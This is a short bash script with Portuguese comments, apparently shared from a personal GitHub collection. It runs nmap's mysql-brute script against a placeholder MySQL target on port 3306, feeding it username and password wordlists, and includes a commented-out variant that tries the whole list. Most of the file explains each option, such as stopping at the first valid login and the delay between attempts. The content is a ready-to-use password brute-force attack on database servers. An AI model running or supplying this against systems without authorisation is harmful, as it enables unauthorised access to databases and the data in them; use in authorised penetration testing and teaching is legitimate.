#! /bin/bash
#Autor: Joao Nossol
#github: https://github.com/joaonossolb

#Brute Force em MYSQL

#Executa o brute force e quando achar a primeira senha, para o brute force
nmap -p3306 --script mysql-brute --script-args userdb=wordlistUsuarios.txt, passdb=wordlistSenhas.txt, brute.firstOnly, unpwd.timelimit=10 <TARGET>

#Executa o brute force por completo, até ler toda a lista de senhas
#nmap -p3306 --script mysql-brute --script-args userdb=wordlistUsuarios.txt, passdb=wordlistSenhas.txt, unpwd.timelimit=10 <TARGET>

#-p --> porta MYSQL
#userdb=wordlistUsuarios.txt, --> Lista de usuarios(pode ter um usuario apenas também)
#passdb=wordlistSenhas.txt, --> Lista de senhas para ser testada
#brute.firstOnly, --> Essa opção define que se encontrar o primeiro usuario e senha, já para os testes.
#unpwd.timelimit=10 --> Limite de tempo entre uma tentativa e outra, nesse caso vai esperar 10 segundos para testar, senha por senha, o default é 0 segundos.
#brute.firstOnly --> Deine que quando achar o primeiro usuario e senha, o brute force é parado...